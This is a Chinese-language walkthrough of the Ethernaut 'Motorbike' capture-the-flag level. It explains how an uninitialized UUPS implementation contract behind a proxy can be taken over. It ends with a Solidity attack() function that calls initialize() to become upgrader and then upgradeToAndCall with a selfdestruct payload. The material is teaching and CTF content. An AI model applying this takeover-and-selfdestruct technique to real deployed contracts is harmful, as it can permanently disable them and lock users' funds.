# Motorbike

## Reference
[Motorbike](https://ethernaut.openzeppelin.com/level/25)

[Motorbike.sol](https://github.com/yuhuajing/ethernaut-book/blob/main/src/25-Motorbike/Motorbike.sol)

## 目标
让合约无法正常使用

## 分析
### 代理合约
1. `Proxy` 合约存储状态，`Engine` 合约存储逻辑
2. `Engine` 合约的数据更新不会影响 `Proxy` 合约的数据，因为 `Proxy` 只会使自己合约存储的数据
3. `Proxy` 合约的数据更新不会影响 `Engine` 合约的数据
4. `Proxy` 合约的数据更新只会影响 `Engine` 合约的函数判断，因为 `Proxy` 会把 `Engine` 合约逻辑拿到 `Proxy EVM` 环境中执行

### Engine-initialize
```solidity
    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }
```
1. `Proxy` 部署时执行了 `Engine` 合约的 `initialize()` 函数，但是 delegatecall 的数据更新仅存在 Proxy 合约中
2. 在 `Engine` 中数据存储仍然为空

#### Engine-upgradeAndCall()
```solidity
    function upgradeToAndCall(address newImplementation, bytes memory data)
    external
    payable
    {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }
```
1. 函数需要 `upgrade` 地址调用
2. 在 `Engine` 逻辑合约中，`upgrade` 通过调用 `initialize()` 函数更新
3. `_upgradeToAndCall` 更新逻辑地址并发起 delegatecall 的初始化交易

## 实现逻辑--修改admin为attack()合约地址
1. 部署 `Attack()` 合约，实现自毁函数
2. 调用 `Engine` 合约 `initialize()` 函数，注册成为 `upgrade`
3. 在 `Engine` 合约中调用 `upgradeAndCall()` 函数：
   1. `Attack()` 作为逻辑地址
   2. 初始化代码执行自毁函数
```solidity
    function attack() external {
        engine.initialize();
        bytes memory data = abi.encodeWithSelector(this.destroy.selector);
        engine.upgradeToAndCall(address(this), data);
    }
```
